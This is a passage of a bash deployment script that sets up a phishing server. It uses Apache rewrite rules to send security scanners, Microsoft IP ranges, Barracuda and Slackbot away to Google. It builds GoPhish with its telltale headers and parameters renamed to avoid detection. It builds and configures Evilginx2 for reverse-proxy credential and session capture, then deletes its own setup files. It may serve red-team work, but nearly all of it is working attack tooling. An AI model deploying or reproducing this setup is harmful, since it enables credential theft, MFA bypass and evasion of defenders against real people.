RewriteCond                             expr                                    "-R '51.145.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '64.4.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '65.52.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '65.54.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '65.55.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '70.37.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '94.245.0.0/16'" [OR]

# Misc crawlers & crap
RewriteCond                             %{HTTP_USER_AGENT}                      ^curl.*$ [OR]
RewriteCond                             %{HTTP_USER_AGENT}                      ^Python-urllib.*$ [OR]
RewriteCond                             %{HTTP_USER_AGENT}                      ^Wget.*$ [OR]
RewriteCond                             %{HTTP_USER_AGENT}                      ^Lynx.*$ 
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

# Barracuda
RewriteCond                             expr                                    "-R '64.235.144.0/24'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]]

# Slack Bot
RewriteCond                             %{HTTP_USER_AGENT}                      ^Slackbot-LinkExpanding.*$
RewriteRule ^.*$ https://www.google.com/ [L,R=302]
EOF

comment_duplicate_vhosts() {
    local CONF_FILE="/etc/apache2/sites-available/${MYDOMAIN}-le-ssl.conf"
    local TMP_FILE="${CONF_FILE}.tmp"

    if [[ ! -f "$CONF_FILE" ]]; then
        echo "[-] Config file not found: $CONF_FILE"
        return 1
    fi

    local inside_block=0
    local ssl_seen=0

    while IFS= read -r line; do
        if [[ "$line" =~ "SSLCertificateKeyFile" ]] && [[ "$ssl_seen" -eq 0 ]]; then
            ssl_seen=1
            echo "$line" >> "$TMP_FILE"
            continue
        fi

        if [[ "$ssl_seen" -eq 1 && "$line" =~ "<VirtualHost" ]]; then
            inside_block=1
            echo "# $line" >> "$TMP_FILE"
            continue
        fi

        if [[ "$inside_block" -eq 1 ]]; then
            echo "# $line" >> "$TMP_FILE"
            [[ "$line" =~ "</VirtualHost>" ]] && inside_block=0
        else
            echo "$line" >> "$TMP_FILE"
        fi
    done < "$CONF_FILE"

    mv "$TMP_FILE" "$CONF_FILE"
    echo "[+] Successfully commented duplicate VirtualHost blocks after first SSL config in $CONF_FILE"
}
comment_duplicate_vhosts
sleep 60
systemctl reload apache2
printf "\n\n${RED}[+] Ignore the above error:Job for apache2.service failed:, apache should be fine, if in doubt, ${NC}systemctl reload apache2 \n"
# Domain setup with TLS cert COMPLETE
printf "\n\n${GREEN}[+] Setting up GoPhish${NC}\n\n"
# Continued setup - Gophish
apt install -y golang git

# Clone and build Gophish as ubuntu user
sudo -u ubuntu bash <<'EOC'
export GOPATH=/home/ubuntu/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
cd /home/ubuntu
git clone https://github.com/gophish/gophish.git
cd gophish
find . -type f -exec sed -i 's/X-Gophish-Contact/X-Contact/g' {} +
find . -type f -exec sed -i 's/X-Gophish-Signature/X-Signature/g' {} +
sed -i 's/const RecipientParameter = "rid"/const RecipientParameter = "id"/g' models/campaign.go
go build
EOC

# Clean up hostname errors
HOSTNAME=$(hostname)
echo "127.0.1.1 $HOSTNAME" | sudo tee -a /etc/hosts > /dev/null

sudo cp /etc/letsencrypt/live/$MYFQDN/fullchain.pem /home/ubuntu/gophish/fullchain.pem
sudo cp /etc/letsencrypt/live/$MYFQDN/privkey.pem /home/ubuntu/gophish/privkey.pem

# Update config.json for TLS
sed -i '3s/127\.0\.0\.1:3333/0.0.0.0:3333/' /home/ubuntu/gophish/config.json
sed -i '10s/0\.0\.0\.0:80/0.0.0.0:8080/' /home/ubuntu/gophish/config.json
sed -i '11s/false/true/' /home/ubuntu/gophish/config.json
sed -i '12s/example\.crt/fullchain.pem/' /home/ubuntu/gophish/config.json
sed -i '13s/example\.key/privkey.pem/' /home/ubuntu/gophish/config.json

# Modify config.go
sed -i '46s/const ServerName = "gophish"/const ServerName = "IGNORE"/' /home/ubuntu/gophish/config/config.go
printf "\n\n${GREEN}[-] GoPhish setup complete!${NC}\n\n"

#GoPhish setup COMPLETE - ready to start up!
printf "${GREEN}[+] Setting up Evilginx${NC}\n\n"

# Continued setup - evilginx
# Clone and build Evilginx as ubuntu user

cd /home/ubuntu
sudo rm -rf /usr/local/go
sudo apt remove golang-go -y
curl -LO https://go.dev/dl/go1.22.2.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.2.linux-amd64.tar.gz
echo 'export PATH=/usr/local/go/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
sudo -u ubuntu bash <<'EOC'
export GOPATH=/home/ubuntu/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
cd /home/ubuntu
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
sed -i 's/^[[:space:]]*req.Header.Set(p.getHomeDir(), o_host)/\/\/&/' /home/ubuntu/evilginx2/core/http_proxy.go
go build
EOC

# Clean up hostname errors again
HOSTNAME=$(hostname)
echo "127.0.1.1 $HOSTNAME" | sudo tee -a /etc/hosts > /dev/null

sudo systemctl stop systemd-resolved.service
sudo rm -rf /etc/resolv.conf
echo -e "nameserver 1.1.1.1\nnameserver 8.8.8.8" | sudo tee /etc/resolv.conf > /dev/null

# Clean up hostname errors again
HOSTNAME=$(hostname)
echo "127.0.1.1 $HOSTNAME" | sudo tee -a /etc/hosts > /dev/null

sudo -u ubuntu bash <<EOF
cd /home/ubuntu/evilginx2
tmux new-session -d -s EvilginxSession1
tmux send-keys -t EvilginxSession1 "cd /home/ubuntu/evilginx2 && sudo /home/ubuntu/evilginx2/evilginx2" C-m
sleep 3
tmux send-keys -t EvilginxSession1 "config domain $MYFQDN" C-m
sleep 3
tmux send-keys -t EvilginxSession1 "config ipv4 external $EC2IP" C-m
sleep 3
tmux send-keys -t EvilginxSession1 "blacklist unauth" C-m
sleep 3
tmux send-keys -t EvilginxSession1 "config unauth_url https://$MYFQDN/" C-m
sleep 2
tmux send-keys -t EvilginxSession1 "blacklist log off" C-m
sleep 2
EOF

#Evilgix setup COMPLETE - Ready to use
printf "\n\n${GREEN}[-] Evilginx setup complete!${NC}\n"
printf "${PURPLE}Join the session with: tmux attach-session -t EvilginxSession1${NC}\n"

sudo -u ubuntu bash <<EOF
cd /home/ubuntu/gophish
tmux new-session -d -s GoPhishSession1
tmux send-keys -t GoPhishSession1 "cd /home/ubuntu/gophish && sudo /home/ubuntu/gophish/gophish" C-m
sleep 3
EOF

printf "\n\n${GREEN}[-] GoPhish setup complete!${NC}\n"
printf "${PURPLE}Join the session with: tmux attach-session -t GoPhishSession1${NC}\n\n"

apachectl -D DUMP_MODULES | grep ssl
printf "${RED}Output from above should say: ssl_module (shared), if not run: sudo systemctl reload apache2${NC} \n"

sudo systemctl stop apache2

printf "\n\n${GREEN}Setup Complete! Everything is ready to use! Enjoy!${NC}\n"

sudo rm -rf /home/ubuntu/config.sh /home/ubuntu/domain-setup.sh /home/ubuntu/server-setup.sh /home/ubuntu/go1.22.2.linux-amd64.tar.gz
